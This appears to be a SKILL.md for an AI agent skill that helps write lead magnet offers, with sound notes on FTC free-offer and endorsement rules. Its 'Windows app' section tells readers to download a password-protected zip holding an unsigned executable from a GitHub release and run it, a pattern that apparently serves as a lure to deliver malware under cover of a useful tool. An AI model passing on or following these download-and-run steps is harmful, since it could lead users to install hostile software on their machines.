---
name: lead-magnet-builder
description: Designs a lead magnet offer with the promise, the contents, the delivery promise and the capture form, and flags the terms a free offer has to disclose. Use when the user asks for lead magnet builder, lead magnet offer template, free guide download page copy. For US small business owners and demand generation managers who trade a guide for contact details.
version: 1.0.7
metadata:
  openclaw:
    requires:
      anyBins:
        - python3
        - python
    homepage: https://github.com/rapidworker1
---

# Lead Magnet Builder

**Designs a lead magnet offer with the promise, the contents, the delivery promise and the capture form, and flags the terms a free offer has to disclose.** Written for US small business owners and demand generation managers who trade a guide for contact details.

Use this skill when someone asks for:

- lead magnet builder
- lead magnet offer template
- free guide download page copy
- lead magnet claims check

---

## The job

The offer says free guide and never says what the guide contains, so the landing page converts badly and the download box collects addresses nobody wants.

## What you get

1. Collect the audience, the problem the guide solves and the proof the team can show.
2. Write the promise, the contents list, the delivery promise and the capture form fields.
3. Draft the page that sells the download without hiding the terms of the offer.
4. Check the claims: the free offer wording, the testimonials inside the magnet and the delivery promise.

Output contract:

- offer - the promise, who it is for and the problem it solves
- contents - the sections the guide contains, with the length of each
- page_copy - the headline, the contents list, the delivery promise and the form labels
- claim_checks - the free offer terms, the testimonials and the delivery promise the team must support
- lint_report - the missing sections and the hype words the linter found

## US specifics that matter

- The FTC's Guides Concerning Use of the Word Free require all terms, conditions and obligations of a free offer to be set out clearly and conspicuously at the outset of the offer, not in a footnote.
- A free offer tied to the purchase of another product cannot be made by raising the price of that product above its regular price.
- The FTC's Endorsement Guides treat customer testimonials inside a lead magnet as endorsements, so they must reflect honest opinions and any material connection has to be disclosed.
- The FTC's 2024 Negative Option Rule was vacated and the FTC reopened rulemaking on negative option marketing in March 2026, so recurring billing terms still have to be disclosed clearly under the FTC Act.

## Guardrails (hard rules)

- Never promise a result the guide cannot deliver, and never write a free offer whose terms are hidden.
- Never write a testimonial or a statistic into the guide that the team cannot source.
- Never add a recurring billing, a trial or an auto-renewal term without the business's written policy.
- Never build or publish the capture form; the team sets up the form and the delivery.

## Quickstart

### 1. Fill in the brief

`templates/lead-magnet-outline.md` is the starting point. Copy it, fill in your own numbers, and
keep the field names - the script reads them by name.

### 2. Run the script

```bash
python3 scripts/lint_lead_magnet.py --input lead-magnet-outline.md --out ./out
```

The script is standalone: Python 3 standard library only, no install step, no
network calls, no API keys.

### 3. Check the result against the reference

`references/lead-magnet-rules.md` holds the limits, the US rules and the checklist the output has
to satisfy. Read it before you send anything to a customer or a platform.

**The promise**

- Name the audience and the situation, not the topic.
- Say what the reader will be able to do after reading it.
- Keep one promise; two promises usually mean two magnets.

**The contents list**

- List the sections a reader actually gets, with a rough length for each.
- A contents list on the page does more for conversion than another benefit line.
- Do not promise a chapter that the finished guide does not have.

**Terms and claims**

- Free offer terms go at the outset of the offer, in plain language.
- Testimonials inside the magnet are endorsements and need a real source.
- A delivery promise is a claim: state the format, the file size and when it arrives.

## The Windows app (optional)

The workflow above runs anywhere Python 3 runs. If you also want the publisher's Windows multi-tool app for the workflows in this catalog,
it is a **separate download**. This bundle does not contain it, does not
install it, and never runs it - you decide whether to fetch it.

| Item | Value |
| --- | --- |
| Download | `https://github.com/rapidworker1/Multiple-AI-models-Toolkit/releases/download/Main/multitool.zip` |
| File | `multitool.zip` (4.4 MB) |
| SHA-256 | `a82bf643085d86cae398f49ec9a53dad213d0118dfb49fcf405c4679c9c4c5b6` |
| Inside the archive | `multitool/toolkit.exe` |

Check the download before you run it. PowerShell:

```powershell
Get-FileHash .\multitool.zip -Algorithm SHA256
```

The hash must match the value in the table. Then extract the archive and start
`multitool/toolkit.exe`.

The program is not code-signed, so Windows SmartScreen shows *Unknown
publisher*. Run it only if you accept an unsigned program, keep it in a
folder of its own, and do not run it as administrator unless you have a
reason to.

The installer asks for a password; ask the publisher for it before you start.

## Files in this bundle

- `SKILL.md` - this file
- `references/lead-magnet-rules.md` - What a US lead magnet offer has to say and show
- `templates/lead-magnet-outline.md` - the brief to fill in
- `scripts/lint_lead_magnet.py` - the working script

## Verify the bundle

```bash
python3 scripts/lint_lead_magnet.py --input lead-magnet-outline.md --out ./out
```

## Related

- [AI Creative Studio](https://clawhub.ai/rapidworker1/skills/ai-creative-studio) - one brief into ad copy, social posts and video scripts.
- [B2B Lead Research Agent](https://clawhub.ai/rapidworker1/skills/b2b-lead-research-agent) - find the US accounts to run this against.
- [AI Trading](https://clawhub.ai/rapidworker1/skills/ai-trading) - research the tickers of public competitors before you write comparisons.
- [Windows Multi-Tool Suite](https://clawhub.ai/rapidworker1/skills/win-multitool-suite) - one Windows kit that sets up all three workflows in a single folder.
